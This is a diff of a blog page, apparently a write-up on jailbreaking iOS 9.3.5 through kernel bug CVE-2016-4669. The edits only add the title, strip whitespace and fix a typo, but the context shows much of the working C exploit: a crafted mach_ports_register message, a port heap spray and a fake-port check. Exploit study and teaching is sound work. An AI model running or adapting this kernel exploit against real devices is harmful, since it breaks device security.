@@ -5,7 +5,7 @@
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta name="theme-color" content="#1b1b1b">
-	<title> | BitFriends&#39; blog</title>
+	<title>Jailbreaking Ios 9.3.5 | BitFriends&#39; blog</title>
 	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
 	<meta name="description" content="">
 	<link rel="stylesheet" href="/css/bundle.css">
@@ -24,7 +24,7 @@
 		
 		<div class="single block">
 			<article class="entry">
-				<h1 class="entry__title"></h1>
+				<h1 class="entry__title">Jailbreaking Ios 9.3.5</h1>
 				<div class="entry__content"><h1 id="jailbreaking-ios-935-cve-2016-4669">jailbreaking ios 9.3.5 (CVE-2016-4669)</h1>
 <p><em>hey I am BitFriends, and in this article, I&rsquo;ll present a detailed ios jailbreak writeup and some basic tips and tricks on how to set up an environment for exploiting. The bug I am exploiting is in the iOS kernel. I hope this is a helpful reference for anyone who wants to start with iOS pwn!</em></p>
 <h5 id="now-let-us-begin">Now let us begin!</h5>
@@ -243,7 +243,7 @@ kern_return_t
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/time.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span> 
+</span><span style="color:#75715e"></span>
 <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;mach/mach_error.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;mach/mach_port.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;mach/mach_time.h&gt;</span><span style="color:#75715e">
@@ -288,7 +288,7 @@ kern_return_t <span style="color:#a6e22e">reg</span>(mach_port_array_t init_port
 <span style="color:#75715e">#ifdef  __MigPackStructs
 </span><span style="color:#75715e">#pragma pack()
 </span><span style="color:#75715e">#endif
-</span><span style="color:#75715e"></span>    
+</span><span style="color:#75715e"></span>
 <span style="color:#75715e">#ifdef  __MigPackStructs
 </span><span style="color:#75715e">#pragma pack(4)
 </span><span style="color:#75715e">#endif
@@ -301,7 +301,7 @@ kern_return_t <span style="color:#a6e22e">reg</span>(mach_port_array_t init_port
 <span style="color:#75715e">#ifdef  __MigPackStructs
 </span><span style="color:#75715e">#pragma pack()
 </span><span style="color:#75715e">#endif
-</span><span style="color:#75715e"></span>    
+</span><span style="color:#75715e"></span>
 <span style="color:#75715e">#ifdef  __MigPackStructs
 </span><span style="color:#75715e">#pragma pack(4)
 </span><span style="color:#75715e">#endif
@@ -313,14 +313,14 @@ kern_return_t <span style="color:#a6e22e">reg</span>(mach_port_array_t init_port
 <span style="color:#75715e">#ifdef  __MigPackStructs
 </span><span style="color:#75715e">#pragma pack()
 </span><span style="color:#75715e">#endif
-</span><span style="color:#75715e"></span>    
+</span><span style="color:#75715e"></span>
     <span style="color:#66d9ef">union</span> {
         Request In;
         Reply Out;
     } Mess;
-    
+
     Request <span style="color:#f92672">*</span>InP <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>Mess.In;
-    
+
     InP<span style="color:#f92672">-&gt;</span>msgh_body.msgh_descriptor_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
     InP<span style="color:#f92672">-&gt;</span>init_port_set.address <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(init_port_set);
     InP<span style="color:#f92672">-&gt;</span>init_port_set.count <span style="color:#f92672">=</span> real;
@@ -334,31 +334,31 @@ kern_return_t <span style="color:#a6e22e">reg</span>(mach_port_array_t init_port
     InP<span style="color:#f92672">-&gt;</span>Head.msgh_request_port <span style="color:#f92672">=</span> mach_task_self();
     InP<span style="color:#f92672">-&gt;</span>Head.msgh_reply_port <span style="color:#f92672">=</span> mig_get_reply_port();
     InP<span style="color:#f92672">-&gt;</span>Head.msgh_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">3403</span>;
-    
-    
+
+
     assert(mach_msg(<span style="color:#f92672">&amp;</span>InP<span style="color:#f92672">-&gt;</span>Head, MACH_SEND_MSG<span style="color:#f92672">|</span>MACH_RCV_MSG<span style="color:#f92672">|</span>MACH_MSG_OPTION_NONE, (mach_msg_size_t)<span style="color:#66d9ef">sizeof</span>(Request), (mach_msg_size_t)<span style="color:#66d9ef">sizeof</span>(Reply), InP<span style="color:#f92672">-&gt;</span>Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
-    
+
     <span style="color:#66d9ef">return</span> KERN_SUCCESS;
 }
 
 mach_port_t dummy <span style="color:#f92672">=</span> MACH_PORT_NULL;
 mach_port_t <span style="color:#a6e22e">spray</span>(mach_msg_size_t num) {
-    
+
     <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>dummy) {
         mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, <span style="color:#f92672">&amp;</span>dummy);
         mach_port_insert_right(mach_task_self(), dummy, dummy, MACH_MSG_TYPE_MAKE_SEND);
     }
-    
+
     mach_port_t init_port_set[<span style="color:#ae81ff">2</span>];
     mach_port_t target;
-    
+
     <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) {
         init_port_set[i] <span style="color:#f92672">=</span> dummy;
     }
-    
+
     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, <span style="color:#f92672">&amp;</span>target);
     mach_port_insert_right(mach_task_self(), target, target, MACH_MSG_TYPE_MAKE_SEND);
-    
+
     <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
         mach_msg_header_t Head;
         mach_msg_body_t msgh_body;
@@ -367,7 +367,7 @@ mach_port_t <span style="color:#a6e22e">spray</span>(mach_msg_size_t num) {
 
     <span style="color:#66d9ef">char</span> buf[<span style="color:#66d9ef">sizeof</span>(Request) <span style="color:#f92672">+</span> num<span style="color:#f92672">*</span><span style="color:#66d9ef">sizeof</span>(mach_msg_ool_ports_descriptor_t)];
     Request <span style="color:#f92672">*</span>InP <span style="color:#f92672">=</span> (Request<span style="color:#f92672">*</span>)buf;
-    
+
     InP<span style="color:#f92672">-&gt;</span>msgh_body.msgh_descriptor_count <span style="color:#f92672">=</span> num;
     <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num; i<span style="color:#f92672">++</span>) {
         InP<span style="color:#f92672">-&gt;</span>init_port_set[i].address <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(init_port_set);
@@ -382,7 +382,7 @@ mach_port_t <span style="color:#a6e22e">spray</span>(mach_msg_size_t num) {
     InP<span style="color:#f92672">-&gt;</span>Head.msgh_reply_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
     InP<span style="color:#f92672">-&gt;</span>Head.msgh_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>;
     assert(mach_msg(<span style="color:#f92672">&amp;</span>InP<span style="color:#f92672">-&gt;</span>Head, MACH_SEND_MSG<span style="color:#f92672">|</span>MACH_MSG_OPTION_NONE, (mach_msg_size_t)<span style="color:#66d9ef">sizeof</span>(Request)<span style="color:#f92672">+</span>num<span style="color:#f92672">*</span><span style="color:#66d9ef">sizeof</span>(mach_msg_ool_ports_descriptor_t), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
-    
+
     <span style="color:#66d9ef">return</span> target;
 }
 
@@ -402,24 +402,24 @@ mach_port_t <span style="color:#a6e22e">exploit</span>(<span style="color:#66d9e
     mach_port_t port_array[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {MACH_PORT_NULL};
     mach_port_t <span style="color:#f92672">*</span>returned_ports <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
     mach_msg_type_number_t sz <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
-    
+
     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, <span style="color:#f92672">&amp;</span>port_array[<span style="color:#ae81ff">0</span>]);
     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, <span style="color:#f92672">&amp;</span>port_array[<span style="color:#ae81ff">1</span>]);
     mach_port_insert_right(mach_task_self(), port_array[<span style="color:#ae81ff">0</span>], port_array[<span style="color:#ae81ff">0</span>], MACH_MSG_TYPE_MAKE_SEND);
     mach_port_insert_right(mach_task_self(), port_array[<span style="color:#ae81ff">1</span>], port_array[<span style="color:#ae81ff">1</span>], MACH_MSG_TYPE_MAKE_SEND);
 
-    
+
     <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1024</span>; i<span style="color:#f92672">++</span>) {
         fp[i] <span style="color:#f92672">=</span> spray(<span style="color:#ae81ff">1</span>);
     }
-    
+
     <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1024</span>; i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>) {
         release(fp[i]);
     }
-    
+
     reg(port_array,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>);
     mach_ports_lookup(mach_task_self(), <span style="color:#f92672">&amp;</span>returned_ports, <span style="color:#f92672">&amp;</span>sz);
-    
+
     mach_port_t fake <span style="color:#f92672">=</span> returned_ports[<span style="color:#ae81ff">2</span>];
     <span style="color:#66d9ef">return</span> (fake <span style="color:#f92672">==</span> dummy);
 }
@@ -432,7 +432,7 @@ mach_port_t <span style="color:#a6e22e">exploit</span>(<span style="color:#66d9e
 [3]: <a href="https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html">https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html</a>
 [4]: <a href="https://gist.github.com/Siguza/96ae6d6806e974199b1d44ffffca5331">https://gist.github.com/Siguza/96ae6d6806e974199b1d44ffffca5331</a></p>
 <h5 id="acknowledgement">Acknowledgement</h5>
-<p>Thanks to Siguza for his exploit I could take as a referance and for helping me!</p>
+<p>Thanks to Siguza for his exploit I could take as a reference and for helping me!</p>
 </div>
 				
 			</article>
